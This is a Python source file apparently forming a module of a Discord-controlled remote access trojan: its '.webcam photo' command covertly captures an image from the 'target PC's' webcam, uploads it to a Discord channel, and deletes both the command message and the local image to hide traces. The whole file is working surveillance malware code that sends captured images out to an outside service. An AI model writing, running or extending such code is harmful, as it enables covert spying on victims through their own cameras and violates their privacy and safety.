import discord
from discord.ext import commands
from discord.ext.commands import Context
import pygame.camera
import pygame.image
import subprocess
import time
from datetime import datetime
import os

class Webcam(commands.Cog, name="webcam"):
    def __init__(self, bot) -> None:
        self.bot = bot

    def current_time(self, formatted=False):
        if formatted:
            return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return datetime.now().strftime('%Y%m%d_%H%M%S')

    @commands.command(
        name="webcam",
        description="Capture an image from the webcam.",
    )
    async def webcam(self, context: Context, action: str = None) -> None:
        """
        Capture an image from the webcam.

        :param context: The application command context.
        :param action: The action to perform, either "photo" or None.
        """
        await context.message.delete()
        if not action:
            reaction_msg = await context.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
            await reaction_msg.add_reaction('🔴')
            return

        if action == 'photo':
            pygame.camera.init()
            cameras = pygame.camera.list_cameras()
            if not cameras:
                reaction_msg = await context.send('No cameras found.')
                await reaction_msg.add_reaction('🔴')
                return

            camera = pygame.camera.Camera(cameras[0])
            camera.start()
            time.sleep(1)  # Give the camera some time to initialize
            image = camera.get_image()
            camera.stop()

            username = os.getlogin()
            software_directory_name = "MySoftwareDirectory"  # Replace with your actual directory name
            image_path = f'C:\\Users\\{username}\\{software_directory_name}\\webcam.png'
            pygame.image.save(image, image_path)

            embed = discord.Embed(title=self.current_time(True) + ' `[On demand]`')
            file = discord.File(image_path, filename="webcam.png")
            embed.set_image(url='attachment://webcam.png')
            reaction_msg = await context.send(embed=embed, file=file)
            await reaction_msg.add_reaction('📌')

            subprocess.run(f'del {image_path}', shell=True)
        else:
            reaction_msg = await context.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
            await reaction_msg.add_reaction('🔴')

async def setup(bot) -> None:
    await bot.add_cog(Webcam(bot))

